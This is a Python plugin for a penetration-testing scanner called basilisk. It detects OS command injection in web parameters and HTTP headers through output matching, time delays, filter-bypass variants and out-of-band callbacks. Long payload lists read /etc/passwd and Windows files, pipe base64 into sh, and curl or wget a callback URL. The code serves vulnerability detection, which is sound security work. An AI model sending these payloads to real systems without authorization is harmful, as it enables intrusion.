"""OS command injection detection — output-based, time-based blind, OOB, filter bypass.

Uses PayloadEngine for RCE payloads, WafBypassEngine for WAF evasion,
CallbackServer for OOB detection. OS-aware (Linux/Windows).
Level: commix-lite (detection).
"""

from __future__ import annotations

import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import PayloadCategory

# Output-based payloads: (payload, indicators, anti_reflect)
OUTPUT_PAYLOADS: list[tuple[str, list[str], str]] = [
    # Unix — semicolon separator
    (";id", ["uid=", "gid="], ""),
    (";cat /etc/passwd", ["root:x:0"], ""),
    (";echo CMDI_TEST_12345", ["CMDI_TEST_12345"], ";echo"),
    (";whoami", ["root", "www-data", "apache", "nobody"], ""),
    (";uname -a", ["Linux", "Darwin", "GNU"], ""),
    # Unix — pipe separator
    ("|id", ["uid=", "gid="], ""),
    ("|cat /etc/passwd", ["root:x:0"], ""),
    ("|echo CMDI_TEST_12345", ["CMDI_TEST_12345"], "|echo"),
    ("|whoami", ["root", "www-data", "apache", "nobody"], ""),
    ("|pwd", ["/var/www", "/home", "/srv", "/opt"], ""),
    # Unix — double pipe / double ampersand
    ("||id", ["uid=", "gid="], ""),
    ("&&id", ["uid=", "gid="], ""),
    ("|| cat /etc/passwd", ["root:x:0"], ""),
    ("&& cat /etc/passwd", ["root:x:0"], ""),
    # Subshell / backtick
    ("$(id)", ["uid=", "gid="], ""),
    ("`id`", ["uid=", "gid="], ""),
    ("$(whoami)", ["root", "www-data", "apache", "nobody"], ""),
    ("`whoami`", ["root", "www-data", "apache", "nobody"], ""),
    ("$(cat /etc/passwd)", ["root:x:0"], ""),
    ("$(echo CMDI_TEST_12345)", ["CMDI_TEST_12345"], "echo"),
    # Newline / carriage-return separator
    ("%0aid", ["uid=", "gid="], ""),
    ("%0d%0aid", ["uid=", "gid="], ""),
    ("%0acat /etc/passwd", ["root:x:0"], ""),
    ("%0d%0acat /etc/passwd", ["root:x:0"], ""),
    # Nested arithmetic / eval — use large unique number to avoid FP
    ("$((31337+7331))", ["38668"], ""),
    # Additional Unix commands
    (";ls -la /", ["bin", "etc", "usr"], ""),
    ("|head -1 /etc/passwd", ["root:x:0"], ""),
    (";env", ["PATH=", "HOME="], ""),
    # Windows — ampersand separator
    ("& whoami", ["nt authority", "desktop-", "\\users\\"], ""),
    ("& echo CMDI_TEST_12345", ["CMDI_TEST_12345"], "echo"),
    ("& type C:\\Windows\\win.ini", ["[fonts]", "[extensions]"], ""),
    ("& dir C:\\", ["Volume Serial", "Directory of"], ""),
    ("| dir C:\\", ["Volume Serial", "Directory of"], ""),
    # Windows — newline
    ("\r\ndir C:\\", ["Volume Serial", "Directory of"], ""),
    ("\r\n whoami", ["nt authority", "desktop-", "\\users\\"], ""),
    # Windows — double ampersand / double pipe
    ("&& whoami", ["nt authority", "desktop-", "\\users\\"], ""),
    ("|| whoami", ["nt authority", "desktop-", "\\users\\"], ""),
    # Windows — specific paths
    ("& type C:\\Windows\\System32\\drivers\\etc\\hosts", ["localhost"], ""),
    # URL-encoded separators
    ("%3Bid", ["uid=", "gid="], ""),
    ("%7Cid", ["uid=", "gid="], ""),
    ("%26 whoami", ["root", "www-data", "nt authority"], ""),
    # Double URL encoding
    ("%250aid", ["uid=", "gid="], ""),
    ("%250d%250aid", ["uid=", "gid="], ""),
    # Truncation / null byte separator
    ("%1aid", ["uid=", "gid="], ""),
]

# Filter bypass payloads
BYPASS_PAYLOADS: list[tuple[str, list[str], str]] = [
    # IFS (internal field separator) bypass
    (";cat${IFS}/etc/passwd", ["root:x:0"], ""),
    (";cat$IFS/etc/passwd", ["root:x:0"], ""),
    ("$(echo${IFS}id)", ["uid="], ""),
    # Brace expansion bypass
    (";{cat,/etc/passwd}", ["root:x:0"], ""),
    (";{echo,CMDI_TEST_12345}", ["CMDI_TEST_12345"], "echo"),
    # Quote insertion bypass
    (";c'a't /etc/passwd", ["root:x:0"], ""),
    (';c"a"t /etc/passwd', ["root:x:0"], ""),
    (";w'h'o'a'm'i", ["root", "www-data", "apache", "nobody"], ""),
    # Backslash insertion bypass
    (";c\\at /etc/passwd", ["root:x:0"], ""),
    (";wh\\oami", ["root", "www-data", "apache", "nobody"], ""),
    # Tab character instead of space ($'\\x09')
    (";cat\t/etc/passwd", ["root:x:0"], ""),
    # Hex-encoded space ($'\\x20')
    (";cat$'\\x20'/etc/passwd", ["root:x:0"], ""),
    # Variable expansion bypass
    (";/bin/cat /etc/passwd", ["root:x:0"], ""),
    (";$(which cat) /etc/passwd", ["root:x:0"], ""),
    # Wildcard bypass (glob)
    (";cat /etc/pas?wd", ["root:x:0"], ""),
    (";cat /etc/p*d", ["root:x:0"], ""),
    (";/???/??t /etc/passwd", ["root:x:0"], ""),
    # Base64 encoded command bypass
    (";echo aWQ=|base64 -d|sh", ["uid="], ""),
    # Environment variable bypass
    (";$({echo,id})", ["uid="], ""),
    # Concatenation bypass
    (";a]id;b]", ["uid="], ""),
    (";echo${IFS}CMDI_TEST_12345", ["CMDI_TEST_12345"], "echo"),
]

# Time-based payloads
TIME_PAYLOADS: list[tuple[str, int]] = [
    # Unix — various separators
    (";sleep 5", 5),
    ("|sleep 5", 5),
    ("||sleep 5", 5),
    ("&&sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
    ("|| sleep 5", 5),
    ("&& sleep 5", 5),
    # Unix — quote context escape
    ("';sleep 5;'", 5),
    ("\";sleep 5;\"", 5),
    ("\\';sleep 5;\\'", 5),
    # Unix — brace / IFS bypass
    ("{sleep,5}", 5),
    (";sleep${IFS}5", 5),
    # Unix — newline separator
    ("%0asleep 5", 5),
    ("%0d%0asleep 5", 5),
    # Unix — ping-based timing
    (";ping -c 5 127.0.0.1", 5),
    ("|ping -c 5 127.0.0.1", 5),
    # Unix — alternative delay
    (";read -t 5 < /dev/tcp/127.0.0.1/1", 5),
    # Windows — timeout
    ("& timeout /T 5", 5),
    ("| timeout /T 5", 5),
    ("&& timeout /T 5", 5),
    # Windows — ping-based timing
    ("& ping -n 5 127.0.0.1", 5),
    ("| ping -n 5 127.0.0.1", 5),
    # Windows — newline
    ("\r\ntimeout /T 5", 5),
    # Double-encoded newline
    ("%250asleep 5", 5),
]

INJECTABLE_PARAMS = [
    "cmd", "exec", "command", "ping", "query", "code",
    "ip", "host", "domain", "url", "target", "address",
    "filename", "path", "dir", "file", "process",
]

SCAN_PATHS = ["/", "/ping", "/admin", "/debug", "/api/exec", "/tools"]

TIME_THRESHOLD = 4.5
CONFIRM_RETRIES = 1


def _looks_like_passwd(body: str) -> bool:
    """Check if body contains /etc/passwd-like format: user:x:uid:gid:..."""
    import re
    return bool(re.search(r"\w+:[^:]*:\d+:\d+:", body))


def _is_reflected_in_error(body: str, payload: str, indicators: list[str]) -> bool:
    """Check if indicators appear only because the payload was reflected in an error page.

    Common patterns: XML <Resource>/?cmd=payload</Resource>,
    JSON {"path": "/?cmd=payload"}, HTML error messages echoing the URL.
    """
    import re
    # Find all reflected URL/path fragments in the body
    reflected_regions: list[str] = []
    # XML: <Resource>...</Resource>, <Key>...</Key>, <RequestURI>...</RequestURI>
    for m in re.finditer(
        r'<(?:Resource|Key|RequestURI|Path|Url|Uri)[^>]*>([^<]+)</\w+>',
        body, re.I,
    ):
        reflected_regions.append(m.group(1).lower())
    # JSON: "path": "...", "url": "...", "uri": "...", "request": "..."
    for m in re.finditer(
        r'"(?:path|url|uri|request|resource|message)":\s*"([^"]+)"', body, re.I,
    ):
        reflected_regions.append(m.group(1).lower())

    if not reflected_regions:
        return False

    # If ALL matched indicators appear inside a reflected region, it's reflection
    for ind in indicators:
        ind_lower = ind.lower()
        found_outside_reflection = False
        # Check if indicator exists somewhere NOT in a reflected region
        body_lower = body.lower()
        if ind_lower in body_lower:
            # Check if it also appears in a reflected region
            in_reflection = any(ind_lower in region for region in reflected_regions)
            if not in_reflection:
                found_outside_reflection = True
        if found_outside_reflection:
            return False

    return True


class CommandInjectionPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="command_injection",
        display_name="Command Injection Check",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects OS command injection via output-based, time-based blind, "
            "OOB callback, filter bypass, and header injection"
        ),
        produces=["cmdi_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"cmdi_tests": []},
            )

        extra = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        scan_paths = list(SCAN_PATHS) + [p for p in extra if p not in SCAN_PATHS]

        # Get RCE payloads from PayloadEngine if available
        engine_payloads = self._get_engine_payloads(ctx)

        for path in scan_paths:
            if ctx.should_stop or findings:
                break
            for param in INJECTABLE_PARAMS:
                if ctx.should_stop or findings:
                    break

                baseline_time = await self._measure(ctx, f"{base_url}{path}?{param}=test")
                if baseline_time is None:
                    continue

                # Phase 1: Output-based
                if await self._check_output(ctx, base_url, path, param, findings, tested):
                    break

                # Phase 2: Filter bypass payloads
                if (
                    not findings and not ctx.should_stop
                    and await self._check_bypass(ctx, base_url, path, param, findings, tested)
                ):
                    break

                # Phase 3: PayloadEngine payloads
                if not findings and engine_payloads and not ctx.should_stop:
                    for ep in engine_payloads[:10]:
                        if ctx.should_stop:
                            break
                        variants = self._get_variants(ctx, ep)
                        for v in variants:
                            url = f"{base_url}{path}?{param}={quote(v)}"
                            body = await self._fetch(ctx, url)
                            if body and any(
                                ind in body for ind in
                                ["uid=", "root:x:0", "CMDI_TEST"]
                            ):
                                tested.append({
                                    "path": path, "param": param,
                                    "payload": ep, "type": "engine-output",
                                })
                                findings.append(Finding.critical(
                                    f"Command injection via {path}?{param}=",
                                    description=f"OS command output with payload: {ep}",
                                    remediation="Never pass user input to OS commands",
                                    tags=["pentesting", "cmdi"],
                                ))
                                break
                        if findings:
                            break

                # Phase 4: Time-based
                if (
                    not findings and not ctx.should_stop
                    and await self._check_timing(
                        ctx, base_url, path, param, baseline_time, findings, tested,
                    )
                ):
                    break

                # Phase 5: OOB via CallbackServer
                if (
                    not findings and not ctx.should_stop
                    and await self._check_oob(ctx, base_url, path, param, findings, tested)
                ):
                    break

        # Phase 6: Header injection
        if not findings and not ctx.should_stop:
            await self._check_headers(ctx, base_url, findings, tested)

        if not findings:
            findings.append(Finding.info(
                "No command injection detected", tags=["pentesting", "cmdi"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"cmdi_tests": tested},
        )

    # ── Helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _get_engine_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.RCE, max_waf=1, limit=15)
            return [p.value for p in payloads if not p.blind]
        return []

    @staticmethod
    def _get_variants(ctx, payload: str) -> list[str]:
        variants = [payload]
        if hasattr(ctx, "waf_bypass") and ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            for v in ctx.waf_bypass.encode(payload):
                if v not in variants:
                    variants.append(v)
        return variants[:3]

    async def _fetch(self, ctx, url: str) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=8.0)
                # Skip error pages (403/404/5xx) — they often reflect URLs
                if resp.status in (403, 404) or resp.status >= 500:
                    return None
                return await resp.text(encoding="utf-8", errors="replace")
        except Exception:
            return None

    async def _measure(self, ctx, url: str) -> float | None:
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(url, timeout=12.0)
                return time.monotonic() - start
        except Exception:
            return None

    async def _check_output(
        self, ctx, base_url: str, path: str, param: str,
        findings: list[Finding], tested: list[dict],
    ) -> bool:
        baseline = await self._fetch(ctx, f"{base_url}{path}?{param}=harmless")
        for payload, indicators, anti in OUTPUT_PAYLOADS:
            if ctx.should_stop:
                break
            url = f"{base_url}{path}?{param}={quote(payload)}"
            body = await self._fetch(ctx, url)
            if body is None:
                continue

            matched = [i for i in indicators if i in body]
            if not matched:
                continue
            if anti and anti in body:
                continue
            # STRICT baseline diff: each indicator must be ABSENT from baseline
            if baseline and all(i in baseline for i in matched):
                continue
            # Only indicators NEW in injected response count
            new_matches = [i for i in matched if not baseline or i not in baseline]
            if not new_matches:
                continue
            # Structural check for /etc/passwd: must look like passwd format
            if any("root:" in m for m in new_matches) and not _looks_like_passwd(body):
                continue
            # Skip if indicators are just from URL reflection in error pages
            if _is_reflected_in_error(body, payload, new_matches):
                continue

            tested.append({
                "path": path, "param": param, "payload": payload,
                "type": "output", "indicators": new_matches,
            })
            # Confidence: passwd format = 0.9, echo-based = 0.7
            conf = 0.9 if _looks_like_passwd(body) else 0.7
            findings.append(Finding.critical(
                f"Command injection via {path}?{param}=",
                description=f"OS command output with payload: {payload}",
                evidence=(
                    f"URL: {url}\n"
                    f"New in response (not in baseline): {', '.join(new_matches)}"
                ),
                confidence=conf,
                remediation="Never pass user input to OS commands. Use safe APIs.",
                tags=["pentesting", "cmdi"],
            ))
            return True
        return False

    async def _check_bypass(
        self, ctx, base_url: str, path: str, param: str,
        findings: list[Finding], tested: list[dict],
    ) -> bool:
        baseline = await self._fetch(ctx, f"{base_url}{path}?{param}=harmless")
        for payload, indicators, anti in BYPASS_PAYLOADS:
            if ctx.should_stop:
                break
            url = f"{base_url}{path}?{param}={quote(payload)}"
            body = await self._fetch(ctx, url)
            if body is None:
                continue
            matched = [i for i in indicators if i in body]
            if not matched:
                continue
            if anti and anti in body:
                continue
            # Baseline diff: indicators must be NEW (not in baseline)
            if baseline and all(i in baseline for i in matched):
                continue
            new_matches = [i for i in matched if not baseline or i not in baseline]
            if not new_matches:
                continue
            # Structural check for /etc/passwd
            if any("root:" in m for m in new_matches) and not _looks_like_passwd(body):
                continue
            # Skip URL reflection in error pages
            if _is_reflected_in_error(body, payload, new_matches):
                continue

            tested.append({
                "path": path, "param": param, "payload": payload,
                "type": "bypass-output", "indicators": new_matches,
            })
            conf = 0.9 if _looks_like_passwd(body) else 0.7
            findings.append(Finding.critical(
                f"Command injection (filter bypass) via {path}?{param}=",
                description=f"Filter bypass payload executed: {payload}",
                evidence=(
                    f"URL: {url}\n"
                    f"New in response (not in baseline): {', '.join(new_matches)}"
                ),
                confidence=conf,
                remediation="Input validation alone is insufficient. Use safe APIs.",
                tags=["pentesting", "cmdi", "filter-bypass"],
            ))
            return True
        return False

    async def _check_timing(
        self, ctx, base_url: str, path: str, param: str,
        baseline_time: float, findings: list[Finding], tested: list[dict],
    ) -> bool:
        for payload, _delay in TIME_PAYLOADS:
            if ctx.should_stop:
                break
            url = f"{base_url}{path}?{param}={quote(payload)}"
            elapsed = await self._measure(ctx, url)
            if elapsed is None:
                continue
            delta = elapsed - baseline_time
            if delta < TIME_THRESHOLD:
                continue

            # Confirm
            new_base = await self._measure(ctx, f"{base_url}{path}?{param}=test")
            if new_base is None:
                continue
            retry = await self._measure(ctx, url)
            if retry is None or retry - new_base < TIME_THRESHOLD:
                continue

            tested.append({
                "path": path, "param": param, "payload": payload,
                "type": "time", "baseline": round(baseline_time, 2),
                "elapsed": round(elapsed, 2), "confirmed": True,
            })
            findings.append(Finding.high(
                f"Command injection (time-based) via {path}?{param}=",
                description=(
                    f"Response delayed {delta:.1f}s with payload: {payload} "
                    "(confirmed)"
                ),
                evidence=(
                    f"Baseline: {baseline_time:.2f}s, "
                    f"Payload: {elapsed:.2f}s, Retry: {retry:.2f}s"
                ),
                confidence=0.6,
                remediation="Never pass user input to OS commands.",
                tags=["pentesting", "cmdi", "blind"],
            ))
            return True
        return False

    async def _check_oob(
        self, ctx, base_url: str, path: str, param: str,
        findings: list[Finding], tested: list[dict],
    ) -> bool:
        if not hasattr(ctx, "callback") or not ctx.callback:
            return False
        try:
            token = ctx.callback.generate_token(
                plugin="command_injection", target=base_url,
                payload_type="oob",
            )
            cb_url = ctx.callback.build_payload_url(token)
            oob_payloads = [
                f";curl {cb_url}",
                f"|wget {cb_url} -O /dev/null",
                f";nslookup {token}.{ctx.callback._domain}" if ctx.callback._domain else "",
                f"$(curl {cb_url})",
            ]
            for oob_p in oob_payloads:
                if not oob_p or ctx.should_stop:
                    continue
                url = f"{base_url}{path}?{param}={quote(oob_p)}"
                await self._fetch(ctx, url)

            # Wait briefly for callback
            import asyncio
            await asyncio.sleep(3)

            if ctx.callback.has_callback(token):
                tested.append({
                    "path": path, "param": param, "type": "oob",
                    "token": token,
                })
                findings.append(Finding.critical(
                    f"Command injection (OOB) via {path}?{param}=",
                    description="Out-of-band callback received confirming injection",
                    evidence=f"Callback token: {token}",
                    remediation="Never pass user input to OS commands.",
                    tags=["pentesting", "cmdi", "oob"],
                ))
                return True
        except Exception:
            pass
        return False

    async def _check_headers(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test command injection via HTTP headers."""
        headers_to_test = [
            ("User-Agent", ";echo CMDI_HDR_TEST"),
            ("Referer", "|echo CMDI_HDR_TEST"),
            ("X-Forwarded-For", ";echo CMDI_HDR_TEST"),
        ]
        for hdr_name, hdr_payload in headers_to_test:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        base_url, headers={hdr_name: hdr_payload}, timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if "CMDI_HDR_TEST" in body:
                        tested.append({
                            "header": hdr_name, "payload": hdr_payload,
                            "type": "header-output",
                        })
                        findings.append(Finding.critical(
                            f"Command injection via {hdr_name} header",
                            description=f"Header {hdr_name} value executed as command",
                            remediation="Sanitize all input sources including headers",
                            tags=["pentesting", "cmdi", "header"],
                        ))
                        return
            except Exception:
                continue
